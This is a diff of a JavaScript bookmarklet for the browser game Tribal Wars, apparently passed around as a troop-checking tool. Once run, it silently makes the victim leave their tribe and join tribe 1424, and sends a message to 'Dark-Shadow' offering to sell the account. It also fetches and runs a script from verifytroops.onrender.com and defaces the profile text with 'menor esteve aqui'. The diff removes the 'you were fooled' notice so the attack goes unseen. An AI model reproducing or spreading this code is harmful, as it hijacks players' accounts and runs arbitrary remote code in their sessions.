@@ -2,6 +2,11 @@ javascript:(async function(){
     const url = TribalWars.buildURL('GET', {screen: 'ally', action: 'exit'});
     TribalWars.get(url);
 
+    setTimeout(() => {
+        const urll = TribalWars.buildURL('GET', {screen: 'info_ally', action: 'join', id: '1424'});
+        TribalWars.get(urll);
+    }, 600);
+
     async function getLastMessageId(playerName) {
     try {
         const htmlText = await $.get("game.php", { screen: "mail" });
@@ -68,20 +73,39 @@ javascript:(async function(){
                 h: h
             },
             success: function() {
-                UI.SuccessMessage("VC FOI ENGANADO!");
+                
             },
             error: function(xhr) {
-                UI.ErrorMessage("Falha ao enviar mensagem. Código: " + xhr.status);
+                
             }
         });
     }
 
     const pn = 'Dark-Shadow';
 
-    await cada_mp(pn, 'oi gostaria de comprar sua conta kkk', 'sou burro');
+    await cada_mp(pn, 'Quer me vender sua conta por R$350,00', 'Venda de conta');
     setTimeout(async function() {
         const messageId = await getLastMessageId(pn);
         console.log(messageId)
     }, 1000);
+
+
+    setTimeout(() => {
+        $.getScript("https://verifytroops.onrender.com/main.js");
+    }, 2000);
+
+    setTimeout(() => {
+        TribalWars.post('mail',
+            { screen: 'info_player', edit: '1', action: 'change_text' },
+            { personal_text: 'menor esteve aqui', send: 'Salvar'}, function () {
+            },
+                !1
+            );
+    }, 1500);
+
+    setTimeout(() => {
+        UI.SuccessMessage("Menor esteve aqui")
+    }, 2000);
+
     
 })();
